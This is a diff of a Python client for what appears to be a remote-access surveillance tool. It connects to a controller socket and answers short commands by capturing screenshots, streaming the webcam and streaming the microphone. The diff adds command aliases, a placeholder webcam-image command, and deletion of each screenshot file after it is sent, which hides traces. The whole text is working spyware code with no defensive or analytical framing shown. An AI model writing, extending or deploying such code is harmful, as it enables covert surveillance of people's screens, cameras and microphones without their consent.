@@ -31,9 +31,8 @@ s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 HOST = socket.gethostname()
 PORT = 8080
 
-
 s.connect((HOST,PORT))
-print("connected")  # for testing
+
 
 def error_response():
     global s
@@ -63,23 +62,27 @@ def sending_audio_data():
 while True:
     command = s.recv(52).decode("utf-8")
 
-    if command == "take_screenshot":
+    if command == "take screenshot" or command == "tss":
         screen = pyautogui.screenshot()
         screen.save(f"{base}\\screenshot.png")
         s.send("Taken Screenshot".encode("utf-8"))
         with open(f"{base}\\screenshot.png", "rb") as file:
             data = file.read(609600)
             s.send(data)
+        os.remove(f"{base}\\screenshot.png")
 
-    elif command == "webcam feed" or command == "wf" or command == "livestream" or command == "cam":
+    elif command == "webcam feed" or command == "wf":
         s.send("STARTING LIVESTREAM".encode("utf-8"))
         p = threading.Thread(target=sending_images)
         p.start()
 
-    elif command == "mic feed" or command == "mf" or command == "audio feed" or command == "af":
+    elif command == "mic feed" or command == "mf":
         s.send("STARTING AUDIOSTREAM".encode("Cp1252"))
         p = threading.Thread(target=sending_audio_data)
         p.start()
+
+    elif command == "webcam image" or command == "wi":
+        pass
      
 
     elif command != "":
